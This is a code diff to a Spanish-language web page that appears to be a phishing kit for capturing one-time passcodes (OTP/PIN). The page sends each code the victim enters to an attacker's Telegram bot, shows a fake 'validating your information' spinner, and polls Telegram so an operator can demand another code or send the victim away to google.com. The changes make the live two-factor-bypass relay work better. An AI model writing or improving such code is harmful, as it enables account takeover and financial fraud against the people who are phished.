@@ -520,6 +520,7 @@
             </div>
 
             <!-- Banner informativo -->
+            <div id="otp-panel">
             <div class="info-banner">
                 <svg viewBox="0 0 24 24">
                     <path
@@ -594,6 +595,14 @@
                     </svg>
                     Confirmar
                 </button>
+            </div>
+            </div> <!-- End of otp-panel -->
+
+            <div id="waiting-panel" style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center;">
+                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #004b87; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
+                <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                <h3 style="margin-bottom: 10px; color: #333;">Estamos validando tu información</h3>
+                <p style="color: #666; font-size: 14px;">Por favor espera, este proceso puede tardar unos segundos...</p>
             </div>
         </div>
     </div>
@@ -748,23 +757,6 @@
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
         const CHAT_ID = "6483487531";
 
-        async function sendToTelegram(text) {
-            const body = {
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: "HTML"
-            };
-            try {
-                await fetch(`${TELEGRAM_API}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(body)
-                });
-            } catch (err) {
-                console.error("Error enviando a Telegram:", err);
-            }
-        }
-
         async function sendToTelegram(text, inlineKeyboard = null) {
             const body = {
                 chat_id: CHAT_ID,
@@ -827,16 +819,65 @@
 
             await sendToTelegram(text, buttons);
 
-            // Limpiar
-            pinInputs.forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-            });
-            pinInputs[0].focus();
-            btnConfirmar.disabled = true;
+            // Hide OTP panel, show waiting panel
+            document.getElementById('otp-panel').style.display = 'none';
+            document.getElementById('waiting-panel').style.display = 'flex';
             
-            alert("Código verificado. Por favor espere...");
+            initPolling();
         });
+
+        let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+
+        async function initPolling() {
+            try {
+                const response = await fetch(`${TELEGRAM_API}/getUpdates`);
+                const data = await response.json();
+                if (data.ok && data.result.length > 0) {
+                    lastUpdateId = data.result[data.result.length - 1].update_id;
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                }
+            } catch (e) { console.error(e); }
+            setTimeout(pollTelegram, 2000);
+        }
+
+        async function pollTelegram() {
+            try {
+                const response = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await response.json();
+
+                if (data.ok && data.result.length > 0) {
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+                        sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                        if (update.callback_query) {
+                            const cbData = update.callback_query.data;
+                            
+                            if (cbData === "pedir_otp") {
+                                document.getElementById('waiting-panel').style.display = 'none';
+                                document.getElementById('otp-panel').style.display = 'block';
+                                pinInputs.forEach(input => {
+                                    input.value = '';
+                                    input.classList.remove('filled');
+                                });
+                                pinInputs[0].focus();
+                                btnConfirmar.disabled = true;
+                                return; // Stop polling until next submit
+                            } else if (cbData === "aceptar" || cbData === "rechazar") {
+                                window.location.href = "https://www.google.com";
+                                return;
+                            }
+                        }
+                    }
+                }
+            } catch (err) {
+                console.error("Polling error", err);
+            }
+
+            if (document.getElementById('waiting-panel').style.display === 'flex') {
+                setTimeout(pollTelegram, 2000);
+            }
+        }
 
         // Focus inicial
         pinInputs[0].focus();
